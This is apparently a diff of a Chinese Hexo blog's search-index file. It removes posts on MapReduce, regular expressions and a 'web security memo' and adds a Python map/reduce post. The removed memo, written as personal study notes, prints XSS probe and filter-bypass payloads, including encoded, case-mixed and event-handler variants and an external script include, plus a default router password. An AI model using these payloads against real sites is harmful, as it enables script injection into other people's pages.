-<p>map由使用者编写,使用一个输入key/value对，生成一组中间key/value对。MapReduce库将有着相同中间Key I中间的value都组合在一起，再传给reduce函数。<br>reduce也由使用者编写，它接受一个中间Key I 和一组与I对应的value.他将这些value合并为一个可能更小的value集合。通常每个reduce调用只产生0或1输出value.中间value是通过一个迭代器提供给reduce函数的。这允许我们操作那些因为大到找不到连续存放的内存而使用链表的value集合。</p>
-<p>Example:</p>
-<figure class="highlight q"><table><tr><td class="code"><pre><code class="hljs q"><span class="hljs-built_in">key</span>,String <span class="hljs-built_in">value</span>):<br>       <span class="hljs-comment">//key:文档名</span><br>       <span class="hljs-comment">//value：文档内容</span><br>       for <span class="hljs-built_in">each</span> word w in <span class="hljs-built_in">value</span>:<br>           EmitIntermediate(w,<span class="hljs-string">"1"</span>);<br>reduce(Stringkey,Iterator values):<br>    <span class="hljs-comment">//key:一个单词</span><br>    <span class="hljs-comment">//value:计数值列表</span><br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>    for <span class="hljs-built_in">each</span> v in values:<br>        result += ParseInt(v);<br>    Emit(AsString(result));<br></code></pre></td></tr></table></figure>
-
-<p>map函数将每个单词与出现次数一同输出（↑例子中鸡蛋的那输出“1”）reduce函数将针对某个特定词输出的次数都合并相加。</p>
-<p>另外，使用者要写代码填充一个符合MapReduce规格的对象，内容包括输入和输出文件的名字，以及可选的调节参数。之后使用者调用MapReduce函数，将指定到对象传进去。用户代码会与MapReduce库链接到一起。</p>
-<p><strong>实现</strong><br>许多不同的MapReduce的实现都是可行的。选择哪一个要取决于环境。例如，一种实现可能适合于小型的共享内存机器，一种实现可能适合于大型的NUMA多处理器机器，而另一种则适合于更大型的联网机器集。</p>
-<p>本部分描述的实现主要面向Google内部广泛使用的计算环境：大型的商用PC机集群，互相之间用交换式以太网连接。我们的环境是：</p>
-<p>主要使用的机器为双核X86处理器，运行Linux系统，每台机器的内存从2GB到4GB不等。</p>
-<p>使用的都是商用网络硬件设备——在机器层面上通常从100Mbps到1Gbps不等，但平均起来要比总带宽的一半少很多。</p>
-<p>集群中拥有数百或数千台机器，因此机器错误经常出现。</p>
-<p>每台机器都使用廉价的IDE硬盘来提供存储功能。我们使用一种内部开发的分布式文件系统来管理这些磁盘上的数据。这个文件系统通过复制的方法在不可靠的硬件之上提供了实用性与可靠性。</p>
-<p>用户向一个调度系统提交作业。每个作业包括了一个任务集，会由调度器调度到集群内可用的一组机器上。</p>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>python</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web安全备忘录</title>
-    <url>/2020/06/18/network-security-basic/</url>
-    <content><![CDATA[<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ol>
-<li><a href="#1">基本网络思维模型</a></li>
-<li><a href="#2">TCP&amp;UDP 笔记</a></li>
-<li><a href="#3">XSS 备忘录</a></li>
-<li><a href="#4">SSRF 备忘录</a></li>
-<li><a href="#5">逻辑漏洞备忘录</a></li>
-<li><a href="#6">上传漏洞备忘录</a></li>
-<li><a href="#7">PHP 远程代码执行备忘录</a></li>
-<li><a href="#8">引用XXE 外部实体注入</a></li>
-<li><a href="#9">RCE_bypass 笔记</a><a id="more"></a>
-<h3 id="0x1-基本网络思维模型"><a href="#0x1-基本网络思维模型" class="headerlink" title="0x1 基本网络思维模型"></a>0x1 <a name="1">基本网络思维模型</a></h3><h5 id="1-1-技术架构CS-Client-Server"><a href="#1-1-技术架构CS-Client-Server" class="headerlink" title="1.1  技术架构CS(Client/Server)"></a>1.1  技术架构CS(Client/Server)</h5><code>Client</code> 指的是客户端，我们每个人的电脑都可以当做一个客户端，日常的一些上网，使用谷歌浏览器搜索东西，打开视频软件浏览视频，打开音乐播放器下载歌曲…这些操作都是要与远方的另一台电脑进行通信的，远方的那台计算机称为服务器<code>（Server）</code>。<h5 id="1-2-技术架构BS-Browser-Server"><a href="#1-2-技术架构BS-Browser-Server" class="headerlink" title="1.2 技术架构BS(Browser/Server)"></a>1.2 技术架构BS(Browser/Server)</h5>通过浏览器访问服务器端的都可以称为BS架构。</li>
-</ol>
-<p><em>Tips：通常的话 <code>BS</code> 架构也是在 <code>CS</code> 架构里面的，但是因为互联网发展迅速，更新换代太快，所以单独将 <code>BS</code> 架构这块分了出来。</em></p>
-<h5 id="1-3-HTTP请求头"><a href="#1-3-HTTP请求头" class="headerlink" title="1.3 HTTP请求头"></a>1.3 HTTP请求头</h5><table>
-<thead>
-<tr>
-<th><strong>协议头</strong></th>
-<th><strong>说明</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>X-Forwarded-For</td>
-<td>用来表示 HTTP 请求端真实 IP</td>
-</tr>
-<tr>
-<td>Accept</td>
-<td>可接受的响应内容类型（Content-Types）</td>
-</tr>
-<tr>
-<td>Accept-Charset</td>
-<td>可接受的字符集</td>
-</tr>
-<tr>
-<td>Accept-Encoding</td>
-<td>可接受的响应内容的编码方式</td>
-</tr>
-<tr>
-<td>Accept-Language</td>
-<td>可接受的响应内容语言列表</td>
-</tr>
-<tr>
-<td>Accept-Datetime</td>
-<td>可接受的按照时间来表示的响应内容版本</td>
-</tr>
-<tr>
-<td>Cookie</td>
-<td>由之前服务器通过Set-Cookie（见下文）设置的一个HTTP协议Cookie</td>
-</tr>
-<tr>
-<td>Content-Length</td>
-<td>以8进制表示的请求体的长度</td>
-</tr>
-<tr>
-<td>Content-MD5</td>
-<td>请求体的内容的二进制 MD5 散列值（数字签名），以 Base64 编码的结果</td>
-</tr>
-<tr>
-<td>Content-Type</td>
-<td>请求体的MIME类型 （用于POST和PUT请求中）</td>
-</tr>
-<tr>
-<td>Date</td>
-<td>发送该消息的日期和时间</td>
-</tr>
-<tr>
-<td>Expect</td>
-<td>表示客户端要求服务器做出特定的行为</td>
-</tr>
-<tr>
-<td>From</td>
-<td>发起此请求的用户的邮件地址</td>
-</tr>
-<tr>
-<td>Host</td>
-<td>表示服务器的域名以及服务器所监听的端口号。</td>
-</tr>
-<tr>
-<td>Origin</td>
-<td>发起一个针对跨域资源共享的请求（该请求要求服务器在响应中加入一个Access-Control-Allow-Origin的消息头，表示访问控制所允许的来源）。</td>
-</tr>
-<tr>
-<td>Range</td>
-<td>表示请求某个实体的一部分，字节偏移以0开始。</td>
-</tr>
-<tr>
-<td>Referer</td>
-<td>表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏览器带到了当前页面。</td>
-</tr>
-<tr>
-<td>User-Agent</td>
-<td>浏览器的身份标识字符串</td>
-</tr>
-</tbody></table>
-<h5 id="1-4-HTTP响应头"><a href="#1-4-HTTP响应头" class="headerlink" title="1.4 HTTP响应头"></a>1.4 HTTP响应头</h5><p>| <strong>响应头</strong>                  | <strong>说明</strong>                                                                                        |<br>| ————————— | ———————————————————— | —-<br>| Access-Control-Allow-Origin | 指定哪些网站可以跨域源资源共享<br>| Accept-Patch                | 指定服务器所支持的文档补丁格式<br>| Accept-Ranges               | 服务器所支持的内容范围<br>| Age                         | 响应对象在代理缓存中存在的时间，以秒为单位<br>| Allow                       | 对于特定资源的有效动作;<br>| Cache-Control               | 通知从服务器到客户端内的所有缓存机制，表示它们是否可以缓存这个对象及缓存有效时间。其单位为秒                  |<br>| Connection                  | 针对该连接所预期的选项<br>| Content-Disposition         | 对已知MIME类型资源的描述，浏览器可以根据这个响应头决定是对返回资源的动作，如：将其下载或是打开。<br>| Content-Encoding            | 响应资源所使用的编码类型。<br>| Content-Language            | 响应内容所使用的语言<br>| Content-Length              | 响应消息体的长度，用8进制字节表示<br>| Content-Location            | 所返回的数据的一个候选位置<br>| Content-Type                | 当前内容的MIME类型<br>| Date                        | 此条消息被发送时的日期和时间<br>| Location                    | 用于在进行重定向，或在创建了某个新资源时使用。<br>| Proxy-Authenticate          | 要求在访问代理时提供身份认证信息。<br>| Refresh                     | 用于重定向，或者当一个新的资源被创建时。默认会在5秒后刷新重定向。<br>| Server                      | 服务器的名称<br>| Set-Cookie                  | 设置HTTP cookie<br>| Status                      | 通用网关接口的响应头字段，用来说明当前HTTP连接的响应状态。<br>| Trailer                     | Trailer用户说明传输中分块编码的编码信息<br>| Transfer-Encoding           | 用表示实体传输给用户的编码形式。包括：chunked、compress、 deflate、gzip、identity。 </p>
-<h5 id="1-5-HTTP请求方式"><a href="#1-5-HTTP请求方式" class="headerlink" title="1.5 HTTP请求方式"></a>1.5 HTTP请求方式</h5><p>GET\POST\PUT\COPY\DELETE\OPTIONS\PATCH</p>
-<h5 id="1-6-HTTP常见状态码"><a href="#1-6-HTTP常见状态码" class="headerlink" title="1.6 HTTP常见状态码"></a>1.6 HTTP常见状态码</h5><p>200、301、302、500、404、403、502</p>
-<h5 id="1-7-GET和POST的区别"><a href="#1-7-GET和POST的区别" class="headerlink" title="1.7 GET和POST的区别"></a>1.7 GET和POST的区别</h5><p>浏览器限制<code>GET</code>接收的的长度，但是不限制<code>POST</code>提交的长度，<code>POST</code>提交的长度取决于服务器。</p>
-<p><strong>数据接收方式</strong></p>
-<p><code>GET</code>请求接收的方式是通过浏览器的地址栏来接收的，而<code>POST</code>是通过表单隐藏式的提交数据。</p>
-<h5 id="1-8-局域网的简单通信（数据链路层）"><a href="#1-8-局域网的简单通信（数据链路层）" class="headerlink" title="1.8 局域网的简单通信（数据链路层）"></a>1.8 局域网的简单通信（数据链路层）</h5><ul>
-<li>一般局域网都是通过交换机/路由器进行通信。</li>
-<li>很早之前的网络大部分是通过HUB（集线器）进行通信。</li>
-<li>缺点就是主机发送的数据包都会被其他的主机接收到，这个过程称为泛洪。</li>
-<li>交换机在此基础上进行了改进，使其变得更安全，同样也保留了HUB的一些功能。</li>
-<li>局域网通过MAC地址表来进行数据通信。</li>
-</ul>
-<h5 id="1-9-交换机主机通信过程"><a href="#1-9-交换机主机通信过程" class="headerlink" title="1.9 交换机主机通信过程"></a>1.9 交换机主机通信过程</h5><ol>
-<li>交换机 <code>ARP</code> 广播</li>
-<li><code>PC</code>计算机接收响应</li>
-<li>发送数据 —&gt; 交换机转发并记录<code>MAC</code>地址</li>
-<li>如果交换机的<code>MAC</code>表被填满，将会泛洪（<code>ARP</code>毒化）</li>
-<li><code>ARP</code>欺骗 —&gt; 伪造<code>MAC</code>地址来进行欺骗的效果</li>
-</ol>
-<p><em>Tips：有些交换机重启的时候会清空<code>MAC</code>地址表。</em></p>
-<h3 id="0x2-TCP-amp-UDP"><a href="#0x2-TCP-amp-UDP" class="headerlink" title="0x2 TCP&amp;UDP"></a>0x2 <a name="2">TCP&amp;UDP</a></h3><h5 id="1-知名端口"><a href="#1-知名端口" class="headerlink" title="1. 知名端口"></a>1. 知名端口</h5><p>系统程序所使用的端口号</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">telnet 23 <br>ftp 21 <br>http 80 <br>https 443 <br>smtp 25 <span class="hljs-built_in"><br>dns </span>53 <br>DHCP 67 <br>tftp 69<br></code></pre></td></tr></table></figure>
-<h5 id="2-动态端口"><a href="#2-动态端口" class="headerlink" title="2. 动态端口"></a>2. 动态端口</h5><p>动态端口的范围时 1024-65535,当服务或者程序关闭时也就释放了所占用的端口</p>
-<figure class="highlight basic"><table><tr><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1433 </span>MSSQL <br><span class="hljs-symbol">1521 </span>Oracle <br><span class="hljs-symbol">3306 </span>MySQL <br><span class="hljs-symbol">5432 </span>PostgreSQL <br><span class="hljs-symbol">6379 </span>redis <br><span class="hljs-symbol">27017 </span>Mongodb <br><span class="hljs-symbol">5000 </span>DB2 <br><span class="hljs-symbol">4848 </span>glassfish<br><span class="hljs-symbol">7001 </span>WebLogic <br><span class="hljs-symbol">2601 </span>zebra路由，默认密码zebra <br><span class="hljs-symbol">3389 </span>远程桌面 (shift 后门) <br><span class="hljs-symbol">8080 </span>apache tomcat <br><span class="hljs-symbol">5900 </span>vnc 虚拟网络控制台 <br><span class="hljs-symbol">11211 </span>memcache未授权访问 <br><span class="hljs-symbol">2181 </span>Zookeeper未授权访问<br></code></pre></td></tr></table></figure>
-<h5 id="3-查看端口"><a href="#3-查看端口" class="headerlink" title="3.查看端口"></a>3.查看端口</h5><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">netstat -an | <span class="hljs-keyword">grep</span> “:<span class="hljs-number">8080</span>”  <span class="hljs-comment"># 显示打开的端口所在协议。</span><br><br>lsof -i :<span class="hljs-number">8080</span>               <span class="hljs-comment"># 显示对应端口的服务名称（所用程序）。</span><br><br>netstat -anp | <span class="hljs-keyword">grep</span> “:<span class="hljs-number">8080</span>” <span class="hljs-comment"># 查看上面两条命令的综合信息</span><br></code></pre></td></tr></table></figure>
-<p><em>Tips：如果该服务不属于当前的用户，需要<code>sudo</code>权限<code>（root）</code></em></p>
-<h5 id="4-UDP协议"><a href="#4-UDP协议" class="headerlink" title="4.UDP协议"></a>4.UDP协议</h5><p><code>UDP</code>发送数据之前不需要建立连接</p>
-<h6 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h6><ol>
-<li>无连接</li>
-<li>资源开销小</li>
-<li>传输速度快</li>
-<li>udp每个数据包最大64k</li>
-</ol>
-<h6 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h6><ol>
-<li>传输速度快</li>
-<li>不需要连接，资源开销小</li>
-</ol>
-<h6 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h6><p>传输数据不可靠，容易丢数据包，没有流量控制，当对方没有及时接受数据，发送方一直发送数据包会导致缓冲区数据溢出，电脑出现卡死情况，所有接受方需及时接受数据。</p>
-<h6 id="UDP-使用场景"><a href="#UDP-使用场景" class="headerlink" title="UDP 使用场景"></a>UDP 使用场景</h6><p>当对网络通讯质量要求不高的时候，要求网络通讯速度尽量的快。</p>
-<p>例如 ：</p>
-<ol>
-<li>音视频传输</li>
-<li>共享屏幕软件</li>
-<li>发送广播消息</li>
-</ol>
-<h5 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h5><ol>
-<li>无连接</li>
-<li>资源开销小</li>
-<li>传输速度快</li>
-<li>udp每个数据包最大64k</li>
-</ol>
-<h5 id="Python-socket"><a href="#Python-socket" class="headerlink" title="Python socket"></a>Python socket</h5><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br>socket.socket(AddressFamily,Type)<br>AddressFamily：IP地址类型；AF_INET代表ipv4类型、AF_INET6表示ipv6类型；<br>Type：套接字类型，可以是SOCK_STREAM (流式套接字，主要用于TCP协议) 或者 SOCK_DGRAM（数据报套接字，UDP协议）<br></code></pre></td></tr></table></figure>
-<h5 id="5-TCP协议"><a href="#5-TCP协议" class="headerlink" title="5.TCP协议"></a>5.TCP协议</h5><h5 id="面向连接"><a href="#面向连接" class="headerlink" title="面向连接"></a>面向连接</h5><p>通信双方必须先建立连接才进行数据的传输，双方都必须为该连接分配必要的系统内核资源，以管理连接的状态和连接上的传输,双方间的数据传输都可以用过这一个连接进行,完成数据交换后，双方必须断开此连接，以释放系统资源,这种连接是一对一的，因此<code>TCP</code>不适合于广播的应用程序，基于广播的程序请使用UDP协议。</p>
-<h5 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h5><ol>
-<li><h5 id="tcp-采用发送应答机制"><a href="#tcp-采用发送应答机制" class="headerlink" title="tcp 采用发送应答机制"></a>tcp 采用发送应答机制</h5><p> <code>tcp</code>发送的每一条报文段必须得到接收方的应答才认为这个<code>tcp</code>报文段传输成功</p>
-</li>
-<li><h5 id="超时重传"><a href="#超时重传" class="headerlink" title="超时重传"></a>超时重传</h5><p> 发送端发出一个报文之后启动定时器，如果在定时时间内没有收到应答就重新发送这个报文段</p>
-</li>
-<li><h5 id="错误效验"><a href="#错误效验" class="headerlink" title="错误效验"></a>错误效验</h5><p> 检测数据到发送端到接收端之间是否有改动，直接丢弃这个数据包</p>
-</li>
-<li><h5 id="流量控制和阻塞管理"><a href="#流量控制和阻塞管理" class="headerlink" title="流量控制和阻塞管理"></a>流量控制和阻塞管理</h5><p> 流量控制用来避免主机发送得过快而使接收方来不及完全收下。</p>
-</li>
-</ol>
-<h5 id="TCP-使用场景"><a href="#TCP-使用场景" class="headerlink" title="TCP 使用场景"></a>TCP 使用场景</h5><p>当对网络通讯质量有要求的时候，比如 <code>HTTP</code>，<code>HTTPS</code>，<code>FTP</code>等网络传输协议，<code>POP</code>，<code>STMTP</code>等邮件传输协议。</p>
-<h3 id="0x3-XSS"><a href="#0x3-XSS" class="headerlink" title="0x3 XSS"></a>0x3 <a name="3">XSS</a></h3><p>XSS 又叫CSS (Cross Site Script) , 跨站脚本攻击。以下为学习《心伤的瘦子XSS系列》的个人笔记，和其他总结的内容。</p>
-<p><strong>1. 一个普通反射型的XSS</strong></p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">http:<span class="hljs-comment">//localhost/xxxxxxxssssssssssss/xss.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>2. HTML编码</strong></p>
-<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs javascript">http://   <br>&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47; <br>&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;<br></code></pre></td></tr></table></figure>
-<p>Tips: 这三个是标签是相等的,都为 <code>http://</code> ，其中 Hex 是十六进制编码,Dec 是十进制编码。</p>
-<p>这种编码在 html 执行的前提是,必须在值里例如：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;a href=”xxx”&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">”xxx”</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
-<p><strong>3. Unicode编码</strong></p>
-<p>Js中是允许使用 unicode编码的。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;  ==  “\x3c” == “\u003c”<br>&gt;  ==  “\x3e” == “\u003e”<br>空格 == “\x20” == ” \u0020”<br>.....<br></code></pre></td></tr></table></figure>
-
-<p><strong>4. CSS编码</strong></p>
-<p>使用 Unicode 写中文字体名称，浏览器是可以正确的解析的。<br>例如：font-family: “5FAE8F6F96C59ED1”，表示设置字体为“微软雅黑”。<br>CSS 中 expression 用来把CSS属性和Javascript表达式关联起来。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;img src=<span class="hljs-string">"URL"</span> style=<span class="hljs-string">'Xss:expression(alert(/xss/));'</span>&gt;<br></code></pre></td></tr></table></figure>
-<p><em>Tips: 但是这种的只能在IE6 , IE7 中才会触发。</em></p>
-<p><strong>5. 宽字节</strong></p>
-<p>Gbxxx系列编码。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">%aa将%<span class="hljs-number">27</span>吞并组成一个gbxxx字符 ==&gt;  猏’<br>%aa%<span class="hljs-number">27</span> | alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>6. eval(string) 函数</strong></p>
-<p>eval 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">'alert(1)'</span>)<br></code></pre></td></tr></table></figure>
-
-<p><strong>7. fromcharcode() 函数</strong></p>
-<p>可接受指定的unicode编码的值，返回字符串，可以配合eval函数使用。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">alert(<span class="hljs-number">1</span>) ==&gt; <span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>)<br><br><br><span class="hljs-comment">// 结合 eval() 函数</span><br><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>))<br></code></pre></td></tr></table></figure>
-
-
-<p><strong>8. 伪协议</strong></p>
-<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs javascript">Javascript:alert(document.domain) <br>data:text/html,&lt;script&gt;alert(1)&lt;/script&gt; <br>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== <br>vbscript: xxxx     // IE中运行<br></code></pre></td></tr></table></figure>
-
-
-<p><strong>9. URL编码</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs url">%0a  &#x2F;&#x2F;  URL换行符  <br>%20  &#x2F;&#x2F;  空格<br>! %21 <br>&quot; %22 <br># %23 <br>$ %24 <br>% %25 <br>&amp; %26 <br>&#39; %27 <br>( %28 <br>) %29 <br>* %2A <br>+ %2B <br>......<br></code></pre></td></tr></table></figure>
-
-
-<p><strong>10. JS 多行字符串</strong></p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">Var a=<span class="hljs-string">'\<br>Test\<br>En\<br>//coding\<br>Aaa'</span><br></code></pre></td></tr></table></figure>
-
-
-<p><strong>11. JS特性</strong></p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&amp; 比 = 优先级高<br>== 比 &amp; 优先级高<br></code></pre></td></tr></table></figure>
-
-
-<p>Javascript 是从上到下按顺序执行的。</p>
-<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs javascript">test()<br>function test()&#123;<br>//code...   这种形式定义的函数会被优先解析<br>&#125;  <br> <br># 实际解析顺序<br>function test()&#123;<br>//code...   这种形式定义的函数会被优先解析<br>&#125; <br>test()<br></code></pre></td></tr></table></figure>
-
-
-<p><strong>12. 注释符</strong></p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//             // js注释</span><br>&lt;!-- --&gt;       <span class="hljs-comment">// HTML注释</span><br><span class="hljs-comment">/**/</span>           <span class="hljs-comment">// js注释</span><br></code></pre></td></tr></table></figure>
-
-
-<p><strong>13. HTML属性</strong></p>
-<p>当元素失去焦点时发生的事件，按下tab键触发js。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">aaaa</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onblur</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">aaaa</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>当元素获得焦点时发生的事件，按下tab键触发js。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">aaaa</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">aaaa</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-<p><strong>14. JS 黑魔法</strong></p>
-<p>1.jjencode –将JS代码转换成只有符号的字符串。</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">网址：http:<span class="hljs-regexp">//u</span>tf-<span class="hljs-number">8</span>.jp<span class="hljs-regexp">/public/</span>jjencode.html<br></code></pre></td></tr></table></figure>
-
-<p>2.aaencode –将JS代码转换成常用的网络表情。</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">网址：http:<span class="hljs-regexp">//u</span>tf-<span class="hljs-number">8</span>.jp<span class="hljs-regexp">/public/</span>aaencode.html<br></code></pre></td></tr></table></figure>
-
-<p>3.Jsfuck –使用六个不同的字符来编写和执行代码。</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">网址：http:<span class="hljs-regexp">//u</span>tf-<span class="hljs-number">8</span>.jp<span class="hljs-regexp">/public/</span>aaencode.html<br></code></pre></td></tr></table></figure>
-
-<p><strong>15. 常用绕过 Payload</strong></p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;svg/onload=prompt(<span class="hljs-number">1</span>);&gt;      <span class="hljs-comment">// 短的xss_payload</span><br><br>&lt;q/oncut=open()&gt;                // 短的xss_payload<br><br>&lt;q/oncut=alert(1)&gt;        // 短的xss_payload<br><br>&lt;scrip&lt;script&gt;t&gt;alealertr(1)&lt;/scrip&lt;script&gt;t&gt;   // 过滤不严<br><br>&lt;ScriPt&gt;alErT(1)&lt;/sCripT&gt;     // 大小写绕过<br><br>&lt;script&gt;prompt(1);&lt;/script&gt;   // 过滤alert 情况下<br><br>&lt;script src="http://www.secbook.info/demo.js"&gt;&lt;/script&gt;<br><br>&lt;div onclick="alert('xss')"&gt;  // 点击它后会触发<br><br>&lt;div onmouseenter="alert('xss')"&gt;  // 用户鼠标移动到 div 上时会触发<br><br>&lt;iframesrc="javascript:alert(2)"&gt;<br><br>&lt;iframe/src="data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="&gt;<br><br>&lt;%0ascript&gt;alert(1);&lt;/script&gt;     // 语法 BUG<br></code></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>security</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>security</tag>
       </tags>
   </entry>
   <entry>
@@ -2868,55 +2584,26 @@ sudo apt-get upgrade</code></p>
       </tags>
   </entry>
   <entry>
-    <title>regular-expression</title>
-    <url>/2020/05/05/regular-expression/</url>
-    <content><![CDATA[<p>正则表达式的重新学习</p>
-<h2 id="回炉重学"><a href="#回炉重学" class="headerlink" title="回炉重学"></a>回炉重学</h2><p>之前学过正则表达式，仅仅停留在会用阶段，每次用的时候还要查语法，问过阿里和腾讯的大牛，有没有好的方法，他们说他们用的时候也要现查，我觉得这个操作不对。</p>
-<p>昨晚做了一个梦，然后突然看明白了。</p>
+    <title>python-map-reduce</title>
+    <url>/2016/09/26/python-map-reduce/</url>
+    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200229/yeRGwfwD44nt.png?imageslim" alt="mark"><br>在Python里内建了Map和Reduce 函数，一开始怎么也看不明白，看图识也不明白。</p>
 <a id="more"></a>
 
-<blockquote>
-<p>正则表达式是定义搜索模式的一串字符串。 </p>
-</blockquote>
-<ol>
-<li>基础<br>正则表达式通常格式化为<code>/&lt;rules&gt;/&lt;flags&gt;</code>  </li>
-</ol>
-<ul>
-<li><strong>/p/g</strong>匹配所有的小写<strong>p</strong><br>a<strong>pp</strong>le</br></li>
-</ul>
-<p><strong>p</strong>ancake<br><strong>p</strong>inea<strong>pp</strong>le<br>mango<br>Plum</p>
-<ul>
-<li><strong>/pp/g</strong>匹配所有的小写字母pp<br>a<strong>pp</strong>le<br>pinea<strong>pp</strong>le<br>ha<strong>pp</strong>iness<br>si<strong>pp</strong>ing a<strong>pp</strong>le juice<br>papaya</li>
-<li><strong>/[aeiou]/g</strong> 从一组字符中匹配一个字符<br>br<strong>i</strong>nj<strong>a</strong>l</br></li>
-</ul>
-<p><strong>a</strong>v<strong>o</strong>c<strong>a</strong>d<strong>o</strong><br><strong>o</strong>n<strong>io</strong>n<br>rhythm  </p>
-<ul>
-<li><strong>/[a-z]/g</strong>匹配所有小写字母<br>H<strong>john</strong>_<strong>s</strong></br></li>
-</ul>
-<p><strong>matej</strong>29  </p>
-<ul>
-<li><strong>/[A-Za-z0-9]/g</strong>匹配大小写字母和数字横行下划线  </li>
-<li><strong>/[^aeiou]/g</strong>匹配非元音字符  </li>
-<li>匹配数字字符<strong>\d</strong> 转义字符 <strong>\d</strong>表示匹配数字字符0-9<blockquote>
-<p><strong>\D</strong> 是<strong>\d</strong>的反面，相当于[^0-9]</p>
-</blockquote>
-</li>
-<li>单词字符 <strong>\w</strong>匹配单词字符，包括小写字母a-z,大写字母A-Z,数字0-9,下划线_<blockquote>
-<p><strong>\W</strong> 相当于[^a-zA-Z0-9_]</p>
-</blockquote>
-</li>
-<li>空白字符 \s 匹配空白字符，具体匹配取决于正则表达式引擎，大多数包括：</li>
-</ul>
-<ol>
-<li>空格</li>
-<li>tab制表符\t</li>
-<li>回车\r</li>
-<li>换行符\n</li>
-<li>换页\f</li>
-</ol>
-<ul>
-<li>. 可以匹配任意一个字符</li>
-</ul>
+<p>直到看了”MapReduce:Simplified Data Processing on Large Clusters” <a class="link"   href="https://www.cs.utexas.edu/~pingali/CS395T/2012sp/lectures/MR-nikhil-panpalia.pdf"  target="_blank" rel="noopener">link<i class="fas fa-external-link-alt"></i></a>（面向大型集群的简化数据处理）这个论文来自GOOGLE.<br><img src="http://www.liaoxuefeng.com/files/attachments/0013879622109990efbf9d781704b02994ba96765595f56000/0" alt="MAP"><br>Map(映射)Reduce(化简)<br>MapRedce 既是一种编程模型，也是一种与之关联的、用于处理和产生大数据集的实现。用户要特化一个map程序去处理key/value对，并产生中间key/value对的集合，以及一个Reduce程序去合并有着相同key的所有中间key/value对。</p>
